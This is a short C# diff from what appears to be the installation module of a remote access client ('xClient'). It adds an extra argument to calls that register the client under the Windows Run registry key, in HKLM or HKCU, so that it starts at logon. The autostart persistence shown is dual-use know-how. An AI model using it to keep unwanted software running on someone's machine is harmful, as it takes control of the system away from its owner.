@@ -20,17 +20,19 @@ namespace xClient.Core.Installation
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
                 bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
-                    Settings.STARTUPKEY, ClientData.CurrentPath);
+                    Settings.STARTUPKEY, ClientData.CurrentPath, true);
 
                 if (success) return true;
 
                 return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
+                    true);
             }
             else
             {
                 return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
+                    true);
             }
         }
 
